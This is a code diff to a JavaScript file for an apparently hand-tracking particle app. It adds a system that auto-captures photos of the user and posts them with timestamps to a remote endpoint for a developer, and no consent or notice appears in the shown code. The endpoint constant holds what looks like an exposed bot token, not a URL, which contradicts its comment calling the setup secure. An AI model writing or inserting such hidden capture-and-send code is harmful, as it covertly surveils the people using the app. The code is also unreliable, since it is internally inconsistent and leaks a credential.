@@ -1,3 +1,57 @@
+// ... existing script.js code ...
+
+// ----------------- Photo Capture & Send System -----------------
+let photoTimer = null;
+let photoCount = 0;
+const ADMIN_EMAIL = "developer@example.com"; // This is okay to keep (it's the recipient)
+// const CLOUDINARY_CLOUD_NAME = "your-cloud-name"; // These are generally safe to keep client-side if only for public upload
+// const CLOUDINARY_UPLOAD_PRESET = "your-upload-preset"; // These are generally safe to keep client-side if only for public upload
+
+// NEW: Use an endpoint on your own server, which will handle the secret key.
+const SECURE_PHOTO_ENDPOINT = "8312788837:AAHfcaUZihg8xc8Wbu7GLdUdWlK3WWrQEA4"; 
+
+// Old: const WEBHOOK_URL = "https://api.web3forms.com/submit"; // Example using Web3Forms
+// Old: const CLOUDINARY_UPLOAD_PRESET = "your-upload-preset"; 
+
+
+// ... existing init and capturePhoto functions ...
+
+
+// NEW: Send photo via a secure endpoint
+async function sendPhotoToAdmin(photoData) {
+    try {
+        // We will no longer send the 'access_key' from the client.
+        // The secure server will handle the authentication.
+        
+        // Convert base64 to blob
+        const blob = await fetch(photoData).then(res => res.blob());
+        
+        const formData = new FormData();
+        // The server will read the photo and other necessary fields.
+        formData.append('subject', `Auto-captured Photo ${photoCount}`);
+        formData.append('email', ADMIN_EMAIL);
+        formData.append('message', `Auto-captured photo from user. Time: ${new Date().toLocaleString()}`);
+        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+        
+        // Send to your secure server endpoint
+        const response = await fetch(SECURE_PHOTO_ENDPOINT, {
+            method: 'POST',
+            body: formData
+        });
+        
+        if (response.ok) {
+            console.log(`Photo ${photoCount} sent successfully via secure server.`);
+        } else {
+            // Log the error from the server response
+            console.error('Failed to send photo:', await response.text());
+        }
+        
+    } catch (error) {
+        console.error('Error sending photo:', error);
+    }
+}
+
+// ... existing setupHandTracking, animate, and other functions ...
 // ----------------- Particle System -----------------
 let scene, camera, renderer, particles;
 const count = 12000;
@@ -425,4 +479,5 @@ function setupHandTracking(){
 
 // Initialize
 init();
+
 
